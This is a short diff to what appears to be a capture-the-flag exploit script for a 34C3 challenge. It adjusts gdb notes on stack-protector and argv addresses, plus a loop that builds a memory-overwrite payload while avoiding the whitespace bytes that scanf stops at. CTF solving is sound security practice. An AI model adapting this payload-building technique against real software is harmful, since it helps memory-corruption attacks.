@@ -75,14 +75,13 @@ lines = [line.rstrip('\n') for line in open('memdump')]
 '''
 gef➤  x __stack_chk_fail
 0x4359b0 <__stack_chk_fail_local>:      0x08ec8348
+
 hex(ord("s")) == 0x73 ($rdx)
 0x6b7424 + 0x73*8 == 0x6b77bc
 
 gef➤  x/s 0x6b4040
 0x6b4040 <flag>:        "34C3_", 'X' <repeats 30 times>
-'''
 
-'''
 # ARGV --> ARGV[0]
 0x6b7980 <__libc_argv>: 0x90    0x79    0x6b    0x00    0x00    0x00    0x00    0x00
 
@@ -108,8 +107,8 @@ for l in lines:
         d = c.replace('0x','')
         e = unhexlify(d)
         if e == '\x09' or e == '\x0a' or e == '\x0b' or e == '\x0c' or e == '\x0d' or e == '\x20':
-            print "[*] Found delimeter 0x%02X" % ord(e)
-            e = '\x41'
+            print "[*] Found whitespace 0x%02X" % ord(e)
+            e = '\x41' # scanf("%s") stops at whitespaces
         overwrite += e
 
 r.send(overwrite + '\n')
